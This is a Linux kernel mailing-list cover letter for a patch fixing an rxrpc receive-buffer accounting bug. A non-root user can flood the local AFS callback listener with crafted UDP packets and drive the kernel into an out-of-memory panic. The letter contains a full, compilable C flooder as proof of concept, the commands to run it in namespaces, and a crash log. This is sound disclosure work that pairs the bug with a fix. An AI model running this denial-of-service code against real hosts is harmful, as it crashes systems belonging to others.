Received: from mail-pj2-f1.google.com (mail-pj2-f1.google.com [74.125.227.129])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 77BE43B6BF9
	for <netdev@vger.kernel.org>; Wed, 29 Jul 2026 19:52:10 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.129
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785354734; cv=none; b=t0+2fLfRj20dibHC7IlYb3qluMXz1ZS++urMgBaSMZYw14TRMiQkYmKdV5/3xpsNQTxUHk6qvJFpm8sG5Cq1mHgBY9WpZKs3wEnG1mM858NgvJK4KEHxOb+4OVrNOiLWv2wQiiXjoI9NfNBb4HJ42cLy02VI6jP5IBvPJMwhStw=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785354734; c=relaxed/simple;
	bh=1S+F/ky14XwUoX+YNSK4H3jWFo5wzkHQRFYFfDs9kjc=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=mr8feJSCI5XU0HvEeOhavscfPA1eK07qHMbBPUv0/DsddiEvnpjWYu/WMzUt2nUxPbCvjGwYHMnXSu6Lzh9KUZNrNiRDK33KEszjGJTxdeBO0ncWs9QK+Qze18FvdXiGfGAaZs65FGJJA9KBCZJ5zdYro9EvPpYPF+K1cupo1rE=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=oQrUNDNL; arc=none smtp.client-ip=74.125.227.129
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="oQrUNDNL"
Received: by mail-pj2-f1.google.com with SMTP id 98e67ed59e1d1-3810f0aba07so659744a91.1
        for <netdev@vger.kernel.org>; Wed, 29 Jul 2026 12:52:10 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1785354728; x=1785959528; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=cfJymxavPhyDVpkhfDrERRcB6RM25iTHbgkwJrVvS5E=;
        b=oQrUNDNL21UPStoYZpxYbL4Ix7/PYTjn9j09KExroW+WWHZ0fTcg2FI6x3A7gC4GUA
         YJIEuBt4UAOXRNO0HKy+OOrIdVe5IPs6wXRwSRMpQr6AA/Ri+eQNszVk4cBFyLcIo+zS
         AOAQnUVOvdxXKtzzgEsAht1IPdgZYRZoifBMGs+ZnAO2yCi0NtLg0z7mHTbbJOxDF5GT
         FKMJzTwcr9G/YuXaiskBVh9/2+vJEp/d35cbt3Yv+2uLLGLQA6ZVbzqosboqWLT8Usdh
         bLpFtl2wMl03vJxU5lKdjz0ZrPlHqzkmFyoUiMe8B4ETZKNVo9ZRW370c249Ob6vHivU
         8gGA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785354728; x=1785959528;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=cfJymxavPhyDVpkhfDrERRcB6RM25iTHbgkwJrVvS5E=;
        b=lPycvRncJHXhwuPR5aDo7bvP3u6kCWWFDBW7z2IRdLjTPo1dhGvbShwftJFyORz7Mz
         miC82Sf/CJv0chdDB4YJXLNONLdqRDBZhQ27h/gTAs/nIw5WbDV6R/HwKxJJXm+hrH1W
         tzo97Sx72//ynDF7NckqunZa480tCWGTDIPikXoTt7J6p5nDMnaQ6D/yIWdDF886kNnK
         GMba+8uWNrKF0VquwFZbr56YJJ/y0rA622tR1R2ha/kXdwlCqbJiepLiibKRv61B8oe2
         yyx7+QbL/9i1HuLdgrkLLqqab2R9HxYIo+vH7CwU9sxLWXEN/KGd1NBgbuhTAuPjuhlf
         yDOQ==
X-Forwarded-Encrypted: i=1; AHgh+Rpl0Og0RaBRlUz5paVaOIUb6S7avZGpLkjFYXL5XNp6viA/2+d8W4LzmOPIzmK0X6afTg8wxEc=@vger.kernel.org
X-Gm-Message-State: AOJu0Yx+XThaIXRtZ2dR/cq91tjaPS6b2hOEWZQKZfkLLstaVsud1EHN
	Ef/Y+Txz3jk/DJzU9P7fqYn8S2q4utHPVE91b6vl3eA98evuPoTq7CtBXqt0rVz0AHy1
X-Gm-Gg: AR+sD13RzeimwtEpbGlJoiNelklrrSMxSYH7X+IcvascQVaIzRfcn1BwfZuYBaPYbHI
	FtEPTK7rXh9QZ8ti3Wnt177efAqJ3Xu9KZGkSQ1yLMdMvcdVRahKKSX8C3Ff6Zgbte9zZWxgI8e
	9FOuzLjCKoQ0Gm58P4CJ4d/oGm57rLsYb6PCjn5ahXmacVLTdOYuNDXUOBZSobbV+R/LaeH2nrD
	pH8wlngTJfBp3xjLicyDkkAkcQ/M84JhxvGS8/JnIEqLCeBXjJi6cZVuEopUjbz+30+D7ckRdMZ
	4CWu+l9id4eqA8vO5/dJXos6VVYUaoMJHBas09ewWnvI2z7R3idCFSt6TMmmvdunQj/XFzXvbXk
	nGGjzcGGWlShVqJVtIIj8hkqqgMUnylfJvfidGcEZztstJM9NurMZlnYwmpRfRJCHMzVf+eL3OX
	VoFOFwSVKgzFFa09G5L8RBRlaBQ6GVGroI0cJc3r8Rl+4CmwGtzVKguqo39lBGkz5nZpqB3L0y/
	12JEq5bXn4=
X-Received: by 2002:a17:90b:4d11:b0:384:8a11:33eb with SMTP id 98e67ed59e1d1-38f99257d04mr230167a91.24.1785354728032;
        Wed, 29 Jul 2026 12:52:08 -0700 (PDT)
Received: from localhost.localdomain ([115.192.250.185])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-38f7f0edc1csm1816958a91.3.2026.07.29.12.52.03
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 29 Jul 2026 12:52:07 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: linux-afs@lists.infradead.org,
	netdev@vger.kernel.org
Cc: dhowells@redhat.com,
	marc.dionne@auristor.com,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	vega@nebusec.ai,
	zihanx@nebusec.ai
Subject: [PATCH net v2 0/1] rxrpc: fix encap_rcv skb accounting exhaustion
Date: Wed, 29 Jul 2026 19:50:25 +0000
Message-ID: <cover.1785339953.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: quoted-printable

Hi Linux kernel maintainers,

We found and validated a issue in net/rxrpc/io_thread.c. The bug is reachab=
le by a
non-root user via user and net namespace through the in-kernel AFS callback=
=0D
listener on [::1]:7001. We've tested it, and it should not affect any other=
 functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

rxrpc_encap_rcv() removes encapsulated UDP packets from the UDP receive pat=
h and
queues them on the RxRPC local queue without preserving UDP receive-buffer
accounting. A local AF_RXRPC service such as the AFS callback listener can
therefore be flooded with RxRPC-shaped UDP packets until the RxRPC receive
buffers grow without bound and can drive the guest into a global OOM panic.

The patch reaccounts each encapsulated skb against the UDP socket before qu=
eueing
it on the RxRPC local queue and drops packets once sk_rcvbuf is exhausted. =
It
also clears sk_user_data under RCU protection and delays sock_release() unt=
il
queued skbs are purged, so the new skb ownership installed by skb_set_owner=
_r()
does not outlive the UDP socket.

The underlying bug existed before this reproducer shape became easy to hit.=
 The
selected Fixes: commit is 446b3e14525b because that is the boundary where
encap_rcv() started queueing the skb for later I/O-thread consumption inste=
ad of
consuming it immediately on the UDP receive path, which is the root-cause f=
act
repaired here.

For this network-triggered bug we also considered packetdrill, but the repr=
oducer
needs a sustained high-rate local UDP flood that keeps the in-kernel callba=
ck
request pending long enough to drive queue growth, so the dedicated sender =
PoC
below was the direct way to validate the failure and the fix.

The crash log block below is the decode_stacktrace.sh-decoded result prepar=
ed for
cover-letter use.

On the unfixed kernel, the reproducer drove /proc/net/rxrpc to:
  - Buffers: rxb=3D152399
  - RxQ=3D46041

On the fixed kernel under the same workload, packet reception continued but:
  - Buffers: rxb=3D0
  - RxQ=3D0

Reproducer:

    gcc -O2 -static -o poc_rxrpc_mem poc.c
    unshare -Urn ./poc_rxrpc_mem

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#define RXRPC_PACKET_TYPE_DATA 1
#define RXRPC_CLIENT_INITIATED 0x01
#define RXRPC_SERVICE_ID 1
#define AFS_CB_CALLBACK_OP 204
#define DEFAULT_PORT 7001
#define DEFAULT_THREADS 4
#define DEFAULT_SECONDS 20
#define DEFAULT_PAYLOAD 8

struct __attribute__((packed)) rxrpc_wire_header {
	uint32_t epoch;
	uint32_t cid;
	uint32_t callNumber;
	uint32_t seq;
	uint32_t serial;
	uint8_t type;
	uint8_t flags;
	uint8_t userStatus;
	uint8_t securityIndex;
	uint16_t reserved;
	uint16_t serviceId;
};

struct thread_args {
	struct sockaddr_in6 dst;
	int seconds;
	size_t payload_len;
	uint32_t cid_seed;
	unsigned long sent;
};

static volatile sig_atomic_t stop_flag;

static void on_alarm(int sig)
{
	(void)sig;
	stop_flag =3D 1;
}

static void *sender_thread(void *arg)
{
	struct thread_args *ta =3D arg;
	int fd;
	char *packet;
	struct rxrpc_wire_header *hdr;
	uint32_t *op;
	uint32_t *count;
	uint32_t seq =3D 1;

	fd =3D socket(AF_INET6, SOCK_DGRAM, 0);
	if (fd < 0) {
		perror("socket");
		return NULL;
	}

	packet =3D malloc(sizeof(*hdr) + ta->payload_len);
	if (!packet) {
		perror("malloc");
		close(fd);
		return NULL;
	}
	memset(packet + sizeof(*hdr), 0, ta->payload_len);
	hdr =3D (struct rxrpc_wire_header *)packet;
	hdr->epoch =3D htonl(0x80000000u | (ta->cid_seed & 0x7fffffffu));
	hdr->cid =3D htonl((ta->cid_seed << 2) | 0);
	hdr->callNumber =3D htonl(1);
	hdr->type =3D RXRPC_PACKET_TYPE_DATA;
	hdr->flags =3D RXRPC_CLIENT_INITIATED;
	hdr->userStatus =3D 0;
	hdr->securityIndex =3D 0;
	hdr->reserved =3D 0;
	hdr->serviceId =3D htons(RXRPC_SERVICE_ID);
	op =3D (uint32_t *)(packet + sizeof(*hdr));
	*op =3D htonl(AFS_CB_CALLBACK_OP);
	if (ta->payload_len >=3D 8) {
		count =3D op + 1;
		*count =3D htonl(1);
	}

	while (!stop_flag) {
		hdr->seq =3D htonl(seq);
		hdr->serial =3D htonl(seq);
		if (sendto(fd, packet, sizeof(*hdr) + ta->payload_len, 0,
			   (struct sockaddr *)&ta->dst, sizeof(ta->dst)) >=3D 0) {
			ta->sent++;
			seq++;
		}
	}

	free(packet);
	close(fd);
	return NULL;
}

static void usage(const char *prog)
{
	fprintf(stderr, "Usage: %s [-a addr] [-p port] [-t threads] [-s seconds] [=
-l payload_len]\n", prog);
}

int main(int argc, char **argv)
{
	struct sockaddr_in6 dst =3D {
		.sin6_family =3D AF_INET6,
		.sin6_port =3D htons(DEFAULT_PORT),
	};
	const char *addr =3D "::1";
	int threads =3D DEFAULT_THREADS;
	int seconds =3D DEFAULT_SECONDS;
	size_t payload_len =3D DEFAULT_PAYLOAD;
	pthread_t *tids;
	struct thread_args *args;
	unsigned long total =3D 0;
	int opt;

	while ((opt =3D getopt(argc, argv, "a:p:t:s:l:h")) !=3D -1) {
		switch (opt) {
		case 'a':
			addr =3D optarg;
			break;
		case 'p':
			dst.sin6_port =3D htons((uint16_t)strtoul(optarg, NULL, 0));
			break;
		case 't':
			threads =3D atoi(optarg);
			break;
		case 's':
			seconds =3D atoi(optarg);
			break;
		case 'l':
			payload_len =3D strtoul(optarg, NULL, 0);
			break;
		default:
			usage(argv[0]);
			return 1;
		}
	}

	if (threads <=3D 0 || seconds <=3D 0 || payload_len < 4 || payload_len > 6=
5000) {
		usage(argv[0]);
		return 1;
	}
	if (inet_pton(AF_INET6, addr, &dst.sin6_addr) !=3D 1) {
		perror("inet_pton");
		return 1;
	}

	signal(SIGALRM, on_alarm);
	alarm(seconds);

	tids =3D calloc((size_t)threads, sizeof(*tids));
	args =3D calloc((size_t)threads, sizeof(*args));
	if (!tids || !args) {
		perror("calloc");
		return 1;
	}

	for (int i =3D 0; i < threads; i++) {
		args[i].dst =3D dst;
		args[i].seconds =3D seconds;
		args[i].payload_len =3D payload_len;
		args[i].cid_seed =3D 1 + (uint32_t)i;
		if (pthread_create(&tids[i], NULL, sender_thread, &args[i]) !=3D 0) {
			fprintf(stderr, "pthread_create(%d) failed: %s\n", i, strerror(errno));
			stop_flag =3D 1;
			threads =3D i;
			break;
		}
	}

	for (int i =3D 0; i < threads; i++) {
		pthread_join(tids[i], NULL);
		total +=3D args[i].sent;
	}

	printf("sent_packets=3D%lu payload_len=3D%zu threads=3D%d duration=3D%d\n",
	       total, payload_len, threads, seconds);
	free(args);
	free(tids);
	return 0;
}

------END poc.c--------

----BEGIN crash log----
[  374.868900][T10021] Kernel panic - not syncing: Out of memory: system-wi=
de panic_on_oom is enabled
[  374.869593][T10021] CPU: 0 UID: 1028 PID: 10021 Comm: poc_rxrpc_mem Not =
tainted 7.1.0-rc1 #2 PREEMPT(full)
[  374.870253][T10021] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, =
1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  374.870955][T10021] Call Trace:
[  374.871183][T10021]  <TASK>
[374.871397][T10021] vpanic+0x6c3/0x790=20
[374.871684][T10021] ? __pfx_vpanic+0x10/0x10=20
[374.871994][T10021] panic=20
[374.872312][T10021] ? __pfx_panic=20
[374.872754][T10021] ? srso_alias_return_thunk=20
[374.873186][T10021] out_of_memory=20
[374.873559][T10021] ? __pfx_out_of_memory=20
[374.873931][T10021] __alloc_frozen_pages_noprof+0x2306/0x2af0=20
[374.874497][T10021] ? __pfx___alloc_frozen_pages_noprof+0x10/0x10=20
[374.874991][T10021] ? srso_alias_return_thunk=20
[374.875378][T10021] ? srso_alias_return_thunk=20
[374.875759][T10021] ? find_held_lock=20
[374.876091][T10021] ? lock_acquire=20
[374.876429][T10021] ? srso_alias_return_thunk=20
[374.876802][T10021] ? find_held_lock=20
[374.877129][T10021] alloc_pages_mpol+0x14a/0x440=20
[374.877462][T10021] ? __pfx_alloc_pages_mpol+0x10/0x10=20
[374.877815][T10021] ? srso_alias_return_thunk=20
[374.878193][T10021] ? srso_alias_return_thunk=20
[374.878616][T10021] ? __check_object_size usercopy.c:254 (discriminator 1)=
 usercopy.c:213 (discriminator 1))=20
[374.878973][T10021] alloc_pages_noprof+0x10/0x110=20
[374.879314][T10021] skb_page_frag_refill=20
[374.879666][T10021] sk_page_frag_refill=20
[374.880012][T10021] __ip6_append_data+0xeea/0x4db0=20
[374.880373][T10021] ? __pfx_ip_generic_getfrag=20
[374.880767][T10021] ? __pfx___ip6_append_data+0x10/0x10=20
[374.881124][T10021] ? srso_alias_return_thunk=20
[374.881501][T10021] ? srso_alias_return_thunk=20
[374.881868][T10021] ? ip6_setup_cork)=20
[374.882286][T10021] ip6_make_skb=20
[374.882692][T10021] ? __pfx_ip_generic_getfrag=20
[374.883077][T10021] ? __pfx_ip6_make_skb=20
[374.883479][T10021] ? srso_alias_return_thunk=20
[374.883888][T10021] ? find_held_lock=20
[374.884290][T10021] ? srso_alias_return_thunk=20
[374.884704][T10021] ? udpv6_sendmsg sock.h:657 (discriminator 7) ipv6.h:41=
5 (discriminator 7) udp.c:1446 (discriminator 7))=20
[374.885080][T10021] udpv6_sendmsg sock.h:657 (discriminator 7) ipv6.h:415 =
(discriminator 7) udp.c:1446 (discriminator 7))=20
[374.885425][T10021] ? __pfx_udpv6_sendmsg=20
[374.885759][T10021] ? srso_alias_return_thunk=20
[374.886131][T10021] ? tomoyo_check_inet_address network.c:532 (discriminat=
or 1))=20
[374.886535][T10021] ? srso_alias_return_thunk=20
[374.886903][T10021] ? srso_alias_return_thunk=20
[374.887276][T10021] ? srso_alias_return_thunk=20
[374.887672][T10021] ? __pfx_aa_sk_perm+0x10/0x10=20
[374.888008][T10021] ? __sys_sendto=20
[374.888340][T10021] __sys_sendto=20
[374.888635][T10021] ? __pfx___sys_sendto=20
[374.888978][T10021] ? srso_alias_return_thunk=20
[374.889369][T10021] ? srso_alias_return_thunk=20
[374.889726][T10021] ? xfd_validate_state=20
[374.890059][T10021] ? xfd_validate_state=20
[374.890405][T10021] __x64_sys_sendto=20
[374.890805][T10021] ? do_syscall_64 common.c:76 (discriminator 4))=20
[374.891199][T10021] ? srso_alias_return_thunk=20
[374.891568][T10021] ? lockdep_hardirqs_on=20
[374.891908][T10021] do_syscall_64=20
[374.892319][T10021] ? irqentry_exit context_tracking.c:91 (discriminator 3=
))=20
[374.892664][T10021] entry_SYSCALL_64_after_hwframe=20
[  374.893158][T10021] RIP: 0033:0x7fcec98fb9ee
[ 374.893546][T10021] Code: 08 0f 85 f5 4b ff ff 49 89 fb 48 89 f0 48 89 d7=
 48 89 ce 4c 89 c2 4d 89 ca 4c 8b 44 24 08 4c 8b 4c 24 10 4c 89 5c 24 08 0f=
 05 <c3> 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 80 00 00 00 00 48 83 ec 08
All code
=3D=3D=3D=3D=3D=3D=3D=3D
   0:	08 0f                	or     %cl,(%rdi)
   2:	85 f5                	test   %esi,%ebp
   4:	4b ff                	rex.WXB (bad)
   6:	ff 49 89             	decl   -0x77(%rcx)
   9:	fb                   	sti
   a:	48 89 f0             	mov    %rsi,%rax
   d:	48 89 d7             	mov    %rdx,%rdi
  10:	48 89 ce             	mov    %rcx,%rsi
  13:	4c 89 c2             	mov    %r8,%rdx
  16:	4d 89 ca             	mov    %r9,%r10
  19:	4c 8b 44 24 08       	mov    0x8(%rsp),%r8
  1e:	4c 8b 4c 24 10       	mov    0x10(%rsp),%r9
  23:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)
  28:	0f 05                	syscall
  2a:*	c3                   	ret		<-- trapping instruction
  2b:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  32:	00 00 00=20
  35:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  3c:	48 83 ec 08          	sub    $0x8,%rsp

Code starting with the faulting instruction
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
   0:	c3                   	ret
   1:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   8:	00 00 00=20
   b:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  12:	48 83 ec 08          	sub    $0x8,%rsp
[  374.894971][T10021] RSP: 002b:00007fcec07fee08 EFLAGS: 00000246 ORIG_RAX=
: 000000000000002c
[  374.895515][T10021] RAX: ffffffffffffffda RBX: 00007fcec07ff6c0 RCX: 000=
07fcec98fb9ee
[  374.896024][T10021] RDX: 000000000000fe04 RSI: 00007fceb0000b70 RDI: 000=
0000000000005
[  374.896545][T10021] RBP: 000055f531372350 R08: 000055f531372350 R09: 000=
000000000001c
[  374.897055][T10021] R10: 0000000000000000 R11: 0000000000000246 R12: 000=
0000000000005
[  374.897565][T10021] R13: 0000000097850000 R14: 0000000000008597 R15: 000=
07fcebffff000
[  374.898159][T10021]  </TASK>
[  374.898988][T10021] Kernel Offset: disabled
[  374.899323][T10021] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zihan Xi

changes in v2:
  - switch the drop path from atomic_inc(&udp_sk->sk_drops) to
    sk_drops_inc(udp_sk)
  - retarget Fixes to 446b3e14525b, the I/O-thread queueing boundary
    identified in the latest public review discussion
  - add a canonical Link: trailer for the public v1 posting
  - state explicitly that the crash log here is decode_stacktrace.sh
    output
  - explain why packetdrill was not used for this reproducer
  - v1 Link: https://lore.kernel.org/all/cover.1784742007.git.zihanx@nebuse=
c.ai/

Zihan Xi (1):
  rxrpc: fix encap_rcv skb accounting exhaustion

 net/rxrpc/io_thread.c    | 15 +++++++++++++--
 net/rxrpc/local_object.c |  8 ++++++--
 2 files changed, 19 insertions(+), 4 deletions(-)

--=20
2.43.0=
